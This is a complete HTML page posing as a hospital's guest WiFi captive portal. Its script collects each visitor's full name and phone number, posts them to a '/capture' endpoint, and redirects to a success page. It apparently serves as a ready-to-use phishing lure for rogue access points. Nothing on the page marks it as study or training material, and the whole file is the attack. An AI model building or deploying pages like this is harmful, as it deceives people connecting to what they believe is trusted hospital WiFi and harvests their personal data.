<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Hospital WiFi</title><style>*{margin:0;padding:0}body{font-family:Arial;background:linear-gradient(135deg,#005eb8,#00a9e0);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#005eb8;font-size:28px;text-align:center;margin-bottom:30px}h2{color:#333;text-align:center;margin-bottom:25px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px}input:focus{outline:none;border-color:#005eb8}button{width:100%;padding:14px;background:#005eb8;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1>HOSPITAL Guest Network</h1></div><h2>Visitor WiFi Access</h2><form id="loginForm"><div class="form-group"><label>Full Name</label><input type="text" id="name" required placeholder="John Doe"></div><div class="form-group"><label>Phone Number</label><input type="tel" id="phone" required placeholder="555-1234"></div><button type="submit">Connect</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const name=document.getElementById('name').value;const phone=document.getElementById('phone').value;console.log('[Hospital] Name:',name,'Phone:',phone);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'Hospital',name:name,phone:phone})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
